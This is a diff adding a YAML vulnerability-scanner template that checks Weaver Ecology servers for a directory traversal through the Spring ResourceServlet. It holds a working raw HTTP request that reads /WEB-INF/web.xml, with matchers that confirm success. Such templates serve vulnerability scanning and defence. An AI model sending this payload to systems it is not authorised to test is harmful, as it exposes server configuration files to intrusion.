@@ -1,0 +1,25 @@
+id: poc-yaml-ecology-springframework-directory-traversal
+
+info:
+  name: poc-yaml-ecology-springframework-directory-traversal
+  author: l1nk3r
+  severity: medium
+  tags: xray-converted,ct-158983
+  reference:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
+
+http:
+  - raw:
+      - |
+        GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<url-pattern>/weaver/"
